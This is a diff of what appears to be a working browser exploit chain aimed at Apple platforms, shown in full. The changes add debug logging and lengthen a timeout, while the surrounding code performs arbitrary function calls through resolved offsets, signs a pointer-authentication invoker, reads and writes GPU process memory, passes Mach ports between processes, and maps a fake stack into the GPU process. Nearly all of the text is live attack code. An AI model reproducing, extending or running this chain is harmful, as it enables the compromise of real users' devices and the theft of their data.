@@ -6633,13 +6633,13 @@
   const GL_PIXEL_UNPACK_BUFFER = 0x88EC;
   const GL_UNPACK_IMAGE_HEIGHT = 0x806E;
   function ASSERT_NOT_REACHED(message) {
-    log(`ASSERT_NOT_REACHED: ${message}`);
+    LOG(`ASSERT_NOT_REACHED: ${message}`);
     fcall(offsets.exit, 0n);
     while (1);
   }
   function ASSERT(condition, message) {
     if (!condition) {
-      log(`ASSERT: ${message}`);
+      LOG(`ASSERT: ${message}`);
       fcall(offsets.exit, 0n);
       while (1);
     }
@@ -8161,6 +8161,7 @@
     gpu_slow_write64(slowFcallResult + 8n, slowFcallResult - 0x18n);
     gpu_slow_write64(invoker_x0 + 0x20n, slowFcallResult);
     let invoker_type = 0;
+    const GPU_SLOW_FCALL_TIMEOUT_MS = 20000;
     function gpu_slow_fcall_1(pc, x0 = 0n, x1 = 0n, x2 = 0n) {
       if (invoker_type != 1) {
         gpu_slow_write64(invoker_arg, paciza_security_invoker_1);
@@ -8177,7 +8178,7 @@
         while (true) {
           const result = gpu_slow_read64(slowFcallResult);
           if (result) return result;
-          if (performance.now() - fcall_begin > 5000) {
+          if (performance.now() - fcall_begin > GPU_SLOW_FCALL_TIMEOUT_MS) {
             ASSERT_NOT_REACHED('gpu_slow_fcall_1 timed out waiting for result');
           }
         }
@@ -8200,7 +8201,7 @@
         while (true) {
           const result = gpu_slow_read64(slowFcallResult);
           if (result != 0x71n) return result;
-          if (performance.now() - fcall_begin > 5000) {
+          if (performance.now() - fcall_begin > GPU_SLOW_FCALL_TIMEOUT_MS) {
             ASSERT_NOT_REACHED('gpu_slow_fcall_2 timed out waiting for result');
           }
         }
@@ -8354,7 +8355,7 @@
           if (result !== MAGIC) {
             return result;
           }
-          if (performance.now() - fcall_begin > 5000) {
+          if (performance.now() - fcall_begin > GPU_SLOW_FCALL_TIMEOUT_MS) {
             ASSERT_NOT_REACHED('gpu_slow_fcall timed out waiting for result');
           }
         }
@@ -8373,11 +8374,15 @@
         this.sendPort = sendPort;
       }
       createReceivePort() {
+        LOG(`GPURemoteConnection.createReceivePort: mach_port_allocate start`);
         let kr = gpu_slow_fcall(offsets.mach_port_allocate, __mach_task_self, 1n, scratchPad + 0x10n);
+        LOG(`GPURemoteConnection.createReceivePort: mach_port_allocate kr=${kr.hex()}`);
         ASSERT(!kr, "createReceivePort.mach_port_allocate has been failed");
         this.receivePort = gpu_slow_read32(scratchPad + 0x10n);
         LOG(`this.receivePort: ${this.receivePort.hex()} `);
+        LOG(`GPURemoteConnection.createReceivePort: mach_port_insert_right start`);
         kr = gpu_slow_fcall(offsets.mach_port_insert_right, __mach_task_self, this.receivePort, this.receivePort, 0x14n);
+        LOG(`GPURemoteConnection.createReceivePort: mach_port_insert_right kr=${kr.hex()}`);
         ASSERT(!kr, "createReceivePort.mach_port_insert_right has been failed");
       }
       sendMessage(encoder, attachments = []) {
@@ -8423,15 +8428,21 @@
         const message_u8 = new Uint8Array(message);
         const message_ptr = allocate_gpu_memory(BigInt(message.byteLength));
         copy_to_gpu(message_ptr, message_u8);
-        return gpu_slow_fcall(offsets.mach_msg_fn, message_ptr, 145n, BigInt(messageSize), 0n, 0n, 0n, 0n);
+        LOG(`GPURemoteConnection.sendMessage: mach_msg send start size=${messageSize}`);
+        const kr = gpu_slow_fcall(offsets.mach_msg_fn, message_ptr, 145n, BigInt(messageSize), 0n, 0n, 0n, 0n);
+        LOG(`GPURemoteConnection.sendMessage: mach_msg send kr=${kr.hex()}`);
+        return kr;
       }
       receiveMemoryPort() {
         let port;
+        LOG(`GPURemoteConnection.receiveMemoryPort: mach_msg receive start`);
         const kr = gpu_slow_fcall(offsets.mach_msg_fn, gpu_receiveBufferDataPointer, 0x906n, 0n, receiveBufferSizeAsBigInt, this.receivePort, 5000n, 0n);
+        LOG(`GPURemoteConnection.receiveMemoryPort: mach_msg receive kr=${kr.hex()}`);
         if (kr == KERN_SUCCESS) {
           const buffer = copy_from_gpu(gpu_receiveBufferDataPointer, 0x40n);
           const bufferU32 = new Uint32Array(buffer);
           port = BigInt(bufferU32[7]);
+          LOG(`GPURemoteConnection.receiveMemoryPort: port=${port.hex()}`);
         } else if (kr == 0x10004003n) {
           ASSERT_NOT_REACHED("[!] mach_msg(): process not responding");
         } else {
@@ -8444,12 +8455,16 @@
     ;
     const remoteConnection = new GPURemoteConnection();
     remoteConnection.createReceivePort();
+    LOG(`remoteConnection bootstrap send start`);
     let kr = remoteConnection.sendMessage(new Encoder(0x1337, 0n), [remoteConnection.receivePort]);
+    LOG(`remoteConnection bootstrap send kr=${kr.hex()}`);
     ASSERT(!kr, "remoteConnection.sendMessage has been failed");
+    LOG(`waiting for secondary send port from GPU`);
     const secondarySendPort = (() => {
       const decoder = gpuConnection.receiveMessage(0x1337);
       return decoder.attachments[0];
     })();
+    LOG(`secondarySendPort: ${secondarySendPort.hex()}`);
     const secondaryConnection = new Connection();
     secondaryConnection.setSendPort(secondarySendPort);
     secondaryConnection.createReceivePort();
@@ -8484,11 +8499,15 @@
         }
       }
       ASSERT(fakeStackDataPointer == (fakeStackDataPointer & ~0x3fffn), "fakeStack is not page aligned");
+      LOG(`mach_make_memory_entry_64 start fakeStack=${fakeStackDataPointer.hex()}`);
       kr = fcall(offsets.mach_make_memory_entry_64_fn, __mach_task_self, sizeBufferDataPointer, fakeStackDataPointer, 3n, sizeBufferDataPointer + 8n, 0n);
+      LOG(`mach_make_memory_entry_64 kr=${kr.hex()}`);
       ASSERT(!kr, "mach_make_memory_entry_64 has failed");
       const memPort = sizeBuffer[1];
       LOG(`memPort: ${memPort.hex()} `);
+      LOG(`secondaryConnection.sendMessage start`);
       kr = secondaryConnection.sendMessage(new Encoder(0x1338, 0n), [memPort]);
+      LOG(`secondaryConnection.sendMessage kr=${kr.hex()}`);
       ASSERT(!kr, "secondaryConnection.sendMessage has failed");
       const gpu_memPort = remoteConnection.receiveMemoryPort();
       LOG(`gpu_memPort: ${gpu_memPort.hex()} `);
@@ -8498,6 +8517,7 @@
       LOG('going to mach_vm_map');
       LOG(`gpu_receiveBufferDataPointer: ${gpu_receiveBufferDataPointer.hex()}`);
       kr = gpu_slow_fcall(offsets.mach_vm_map_fn, __mach_task_self, gpu_receiveBufferDataPointer, 0x88000n, 0n, VM_FLAGS_ANYWHERE, gpu_memPort, 0n, 0n, (3n << 32n) + 3n, VM_INHERIT_NONE);
+      LOG(`mach_vm_map kr=${kr.hex()}`);
       ASSERT(!kr, "mach_vm_map has failed");
       const gpu_memory = gpu_slow_read64(gpu_receiveBufferDataPointer);
       LOG(`gpu_memory: ${gpu_memory.hex()} `);
